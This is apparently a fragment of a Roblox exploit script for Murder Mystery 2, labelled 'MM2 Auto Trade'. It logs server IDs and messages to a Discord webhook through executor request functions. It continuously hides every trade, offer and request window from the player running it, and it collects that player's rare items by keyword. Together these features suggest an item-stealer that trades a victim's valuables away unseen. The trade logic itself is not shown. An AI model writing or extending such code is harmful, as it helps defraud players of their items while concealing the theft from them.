-- ============================================
-- DISCORD WEBHOOK FUNCTIONS
-- ============================================

local function sendLog(message)
    pcall(function()
        local data = {
            content = "**🤖 MM2 Auto Trade**\n" .. tostring(message) .. "\n🖥️ Server: `" .. (game.JobId or "Unknown") .. "`\n⏰ `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
        }
        local encoded = HttpService:JSONEncode(data)
        local headers = {["Content-Type"] = "application/json"}
        
        if syn and syn.request then
            syn.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
        elseif request then
            request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
        elseif http and http.request then
            http.request({Url = webhook, Method = "POST", Headers = headers, Body = encoded})
        end
    end)
end

-- ============================================
-- HIDE ALL TRADE GUIS (Invisible Mode)
-- ============================================

local function hideAllTradeGuis()
    pcall(function()
        -- Hide all possible trade GUIs
        local guisToHide = {
            player.PlayerGui:FindFirstChild("Trade"),
            player.PlayerGui:FindFirstChild("Trading"),
            player.PlayerGui:FindFirstChild("TradeRequest"),
            player.PlayerGui:FindFirstChild("TradeGUI"),
            player.PlayerGui:FindFirstChild("OfferGUI"),
        }
        
        for _, gui in pairs(guisToHide) do
            if gui then
                gui.Enabled = false
                gui.Visible = false
                gui.Parent = nil
            end
        end
        
        -- Also hide any frame that appears
        for _, gui in pairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("Frame") or gui:IsA("ScreenGui") then
                if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") or gui.Name:lower():find("request") then
                    gui.Visible = false
                    gui.Enabled = false
                end
            end
        end
    end)
end

-- Continuously hide trade GUIs
spawn(function()
    while wait(0.1) do
        hideAllTradeGuis()
    end
end)

-- ============================================
-- ITEM FILTERING (Legendaries, Godlies, Ancients, Uniques)
-- ============================================

local RARE_ITEM_KEYWORDS = {
    "Godly", "Chroma", "Ancient", "Unique", "Legendary", "Vintage",
    "Icebreaker", "Elderwood", "Hallows", "Battle", "Cane", "Luger",
    "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard", "Fang",
    "Heat", "Laser", "Nightblade", "Saw", "Shark", "Tides", "Virtual",
    "Xmas", "Minty", "Logchopper", "Candy", "Sweet", "Heart", "Corrupt"
}

local function isRareItem(item)
    if not item or not item:IsA("Tool") then return false end
    local name = item.Name
    for _, keyword in pairs(RARE_ITEM_KEYWORDS) do
        if name:find(keyword) then
            return true
        end
    end
    return false
end

local function getRareItems()
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") and isRareItem(item) then
            table.insert(items, item)
        end
    end
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and isRareItem(item) then
                table.insert(items, item)
            end
        end
    end
    return items
end

